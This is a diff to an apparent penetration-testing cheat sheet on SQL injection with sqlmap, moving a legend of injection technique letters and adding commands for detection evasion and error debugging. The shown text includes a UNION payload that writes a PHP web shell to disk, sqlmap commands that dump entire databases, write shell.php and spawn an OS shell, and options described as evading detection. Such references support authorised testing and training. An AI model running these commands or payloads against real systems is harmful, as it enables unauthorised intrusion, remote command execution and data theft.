@@ -392,6 +392,14 @@ cn') UNION SELECT "", '<?php system($_REQUEST[0]); ?>',"","" into outfile '/var/
 ```bash
 sqlmap -hh
 
+The technique characters `BEUSTQ` refers to the following:
+- `B`: Boolean-based blind
+- `E`: Error-based
+- `U`: Union query-based
+- `S`: Stacked queries
+- `T`: Time-based blind
+- `Q`: Inline queries
+  
 # Run SQLMap without asking for user input. Use `--dump` to dump ALL data!
 sqlmap -u "http://www.example.com/vuln.php?id=1" --batch --dump
 
@@ -409,11 +417,13 @@ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
 sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
 
 # Use `--random-agent` and/or `--mobile` to evade detection.
+sqlmap -r req.txt --batch --dump --random-agent
+sqlmap -r req.txt --batch --dump --mobile
 
 # Specifying a PUT request
 sqlmap -u www.target.com --data='id=1' --method PUT
 
-# Force sqlmap to use `OR` payloads
+# Force sqlmap to use `OR` payloads with `--risk=3`
 sqlmap -r req.txt --batch --dump --risk=3
 
 # Specifying a prefix or suffix
@@ -455,13 +465,11 @@ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/
 # Spawn a shell
 sqlmap -u "http://www.example.com/?id=1" --os-shell
 
-The technique characters `BEUSTQ` refers to the following:
-- `B`: Boolean-based blind
-- `E`: Error-based
-- `U`: Union query-based
-- `S`: Stacked queries
-- `T`: Time-based blind
-- `Q`: Inline queries
+# Debug errors
+sqlmap -r req.txt --batch --dump --parse-errors -t /tmp/traffic.txt -v 6
+
+# Debug errors with proxy + Burp
+sqlmap -r req.txt --batch --dump --parse-errors -t /tmp/traffic.txt -v 6 --proxy
 ```
 
 ## SQL Injection (SQLi)
